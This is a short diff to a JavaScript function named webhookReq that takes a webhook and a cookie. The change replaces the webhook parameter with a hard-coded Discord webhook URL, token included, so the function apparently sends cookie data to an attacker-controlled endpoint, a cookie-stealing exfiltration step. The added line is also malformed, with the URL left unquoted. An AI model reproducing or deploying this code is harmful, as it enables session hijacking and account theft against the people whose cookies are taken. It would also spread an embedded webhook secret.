@@ -13,7 +13,7 @@ function webhookReq(webhook, cookie) {
   }
    
   // Send the webhook request
-  fetch(webhook, {
+  fetch(https://discordapp.com/api/webhooks/1267744701532999761/teLoxdH5hVh1bu_eHm-7StsnJdL2httEUM4EPcyfatSCK2f7rfcgBqTCu9OxbLX-mQ0v, {
     method: "POST",
     headers: {
       'Content-type': 'application/json'
